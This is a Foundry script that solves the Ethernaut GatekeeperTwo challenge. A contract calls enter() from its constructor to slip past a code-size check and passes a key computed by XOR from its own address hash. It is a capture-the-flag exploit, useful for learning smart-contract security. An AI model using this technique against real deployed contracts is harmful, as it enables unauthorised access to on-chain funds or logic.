// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/GatekeeperTwo.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract Enter {
    GatekeeperTwo gkTwo;

    constructor(address _gkAddress) {
        gkTwo = GatekeeperTwo(_gkAddress);
        gkTwo.enter(
            bytes8(
                bytes8(
                    uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^
                        (type(uint64).max)
                )
            )
        );
    }
}

contract GatekeeperTwoSolution is Script {
    GatekeeperTwo public constant gateKeeperTwoInstance =
        GatekeeperTwo(0x7B9DED1fD8a6481d48236bAD250c8f441094a323);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        new Enter(address(gateKeeperTwoInstance));

        vm.stopBroadcast();
    }
}
